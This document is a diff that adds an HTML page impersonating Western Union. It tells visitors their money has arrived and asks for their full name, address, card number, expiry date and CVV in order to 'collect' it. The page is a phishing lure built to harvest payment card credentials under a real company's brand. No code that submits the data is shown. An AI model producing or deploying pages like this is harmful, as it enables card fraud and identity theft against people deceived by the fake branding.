@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Card Information - Western Union</title>
+    <link rel="stylesheet" href="styles/style.css">
+</head>
+<body>
+    <header>
+        <img src="../western.png" alt="Western Union Icon" class="wu-icon">
+        <h1>Western Union</h1>
+    </header>
+    <main>
+        <section class="intro-section">
+            <h2>Add Your Card Information</h2>
+            <p class="subtitle">
+                For the customer: <strong>Your money has arrived!</strong> Collect it by adding your credit card details and information below.
+            </p>
+            <p class="subtitle">
+                Please enter your card details to receive your money securely.
+            </p>
+            <form class="card-form">
+                <label for="name">Name:</label>
+                <input type="text" id="name" name="name" placeholder="Enter your name" required>
+                
+                <label for="surname">Surname:</label>
+                <input type="text" id="surname" name="surname" placeholder="Enter your surname" required>
+                
+                <label for="address">Address:</label>
+                <input type="text" id="address" name="address" placeholder="Enter your address" required>
+                
+                <label for="cardNumber">Card Number:</label>
+                <input 
+                    type="text" 
+                    id="cardNumber" 
+                    name="cardNumber" 
+                    placeholder="1234 5678 9012 3456" 
+                    required 
+                    maxlength="19" 
+                    pattern="(\d{4} ?){4}"
+                    title="Enter 16 digits, separated by spaces every 4 digits (e.g. 1234 5678 9012 3456)"
+                    oninput="this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();"
+                >
+                
+                <label for="expiry">Expiry Date:</label>
+                <input 
+                    type="text" 
+                    id="expiry" 
+                    name="expiry" 
+                    placeholder="MM/YY" 
+                    required 
+                    maxlength="5" 
+                    pattern="^(0[1-9]|1[0-2])\/\d{2}$"
+                    title="Format: MM/YY (e.g. 09/25)"
+                    oninput="if(this.value.length === 2 && !this.value.includes('/')) this.value = this.value + '/';"
+                >
+                
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" placeholder="CVV" required maxlength="3" pattern="\d{3}">
+                
+                <label for="email">Email: <span style="color:#FFD700; font-size:0.95em;">(optional)</span></label>
+                <input type="email" id="email" name="email" placeholder="Enter your email">
+                
+                <button type="submit">Submit</button>
+            </form>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2025 Western Union. All rights reserved.</p>
+    </footer>
+</body>
+</html>
